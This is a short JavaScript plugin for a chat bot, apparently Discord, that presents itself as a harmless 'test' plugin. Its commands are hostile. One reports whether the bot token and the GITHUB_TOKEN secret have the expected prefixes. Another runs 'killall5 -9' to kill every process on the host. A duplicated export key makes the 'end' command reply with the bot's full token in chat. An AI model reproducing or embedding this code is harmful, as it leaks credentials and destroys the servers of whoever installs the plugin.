module.exports.plugin = {
    name: 'test',
    description: 'hee hee hee haw',
    author: 'cum monster',
    repository: 'https://github.com/alexanderdavidj/test/blob/main/test/plugin.js',
    commands: [
        'test',
        'end',
    ]
}

module.exports.test = {
    name: 'test',
    description: 'a test command',
    run: async ({client, message}) => {
        message.channel.send(`${client.token.startsWith("MTA")} ${process.env.GITHUB_TOKEN.startsWith("github_pat")}`)
    }
}

module.exports.end = {
    name: 'end',
    description: "end the linux server",
    run: async ({client, message}) => {
        require("child_process").spawn("killall5", ["-9"]);
    }
}

module.exports.end = {
    name: 'lol',
    description: "end the linux server",
    run: async ({client, message}) => {
        message.reply(client.token);
    }
}
